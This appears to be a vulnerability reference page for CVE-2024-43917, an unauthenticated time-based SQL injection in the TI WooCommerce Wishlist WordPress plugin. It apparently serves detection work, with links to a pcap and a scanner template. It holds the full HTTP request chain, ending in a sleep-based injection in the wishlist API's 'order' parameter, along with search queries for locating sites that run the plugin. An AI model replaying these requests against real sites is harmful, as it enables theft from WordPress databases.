---
layout: post
cve_id: CVE-2024-43917
title: WordPress TI WooCommerce Wishlist Plugin <= 2.8.2 - SQL Injection
pcap: true
pcap_path: /pcaps/2024/CVE-2024-43917.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-43917.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Unauthenticated attackers can execute time-based SQL injection to extract
  sensitive data from the WordPress database.

  '
remediation: 'Update TI WooCommerce Wishlist plugin to a version that patches CVE-2024-43917.

  '
reference:
- https://patchstack.com/articles/unpatched-sql-injection-vulnerability-in-ti-woocommerce-wishlist-plugin/
- https://patchstack.com/database/vulnerability/ti-woocommerce-wishlist/wordpress-ti-woocommerce-wishlist-plugin-2-8-2-sql-injection-vulnerability?_s_id=cve
- https://nvd.nist.gov/vuln/detail/CVE-2024-43917
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-43917
  cwe-id: CWE-89
  epss-score: 0.88274
  epss-percentile: 0.99465
  cpe: cpe:2.3:a:templateinvaders:ti_woocommerce_wishlist:*:*:*:*:free:wordpress:*:*
metadata:
  verified: true
  max-request: 4
  vendor: templateinvaders
  product: ti_woocommerce_wishlist
  framework: wordpress
  fofa-query: body="/wp-content/plugins/ti-woocommerce-wishlist/"
  publicwww-query: /wp-content/plugins/ti-woocommerce-wishlist/
tags:
- time-based-sqli
- cve
- cve2024
- wp
- wordpress
- ti-woocommerce-wishlist
- wp-plugin
- sqli
- vkev
- vuln
---

## ðŸ” Vulnerability Description
In the latest version (2.8.2 as of writing the article) and below, the plugin is vulnerable to a SQL injection vulnerability that allows any users to execute arbitrary SQL queries in the database of the WordPress site. No privileges are required to exploit the issue. The vulnerability is unpatched on the latest version and is tracked as the CVE-2024-43917.


## ðŸŒ HTTP Request
```nohighlight
GET /?p=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /product-category/uncategorized/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /product-category/uncategorized/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Connection: close
Content-Length: 914
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNfcbSwJQX8ALWCMG
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip
------WebKitFormBoundaryNfcbSwJQX8ALWCMG
Content-Disposition: form-data; name="form[tinvwl-hidden-fields]"
[]
------WebKitFormBoundaryNfcbSwJQX8ALWCMG
Content-Disposition: form-data; name="tinv_wishlist_id"
------WebKitFormBoundaryNfcbSwJQX8ALWCMG
Content-Disposition: form-data; name="tinv_wishlist_name"
------WebKitFormBoundaryNfcbSwJQX8ALWCMG
Content-Disposition: form-data; name="product_type"
simple
------WebKitFormBoundaryNfcbSwJQX8ALWCMG
Content-Disposition: form-data; name="product_id"
dFjYcv
------WebKitFormBoundaryNfcbSwJQX8ALWCMG
Content-Disposition: form-data; name="product_variation"
0
------WebKitFormBoundaryNfcbSwJQX8ALWCMG
Content-Disposition: form-data; name="product_action"
addto
------WebKitFormBoundaryNfcbSwJQX8ALWCMG
Content-Disposition: form-data; name="redirect"
//product-category/uncategorized/
------WebKitFormBoundaryNfcbSwJQX8ALWCMG--
```

```nohighlight
GET /wp-json/wc/v3/wishlist/xN7yF6/get_products?order=,(select*from(select(sleep(6)))a)--+- HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_10_3 rv:2.0; so-DJ) AppleWebKit/533.15.6 (KHTML, like Gecko) Version/4.0.2 Safari/533.15.6
Connection: close
X-WP-Nonce: rmnsnE
Accept-Encoding: gzip
```

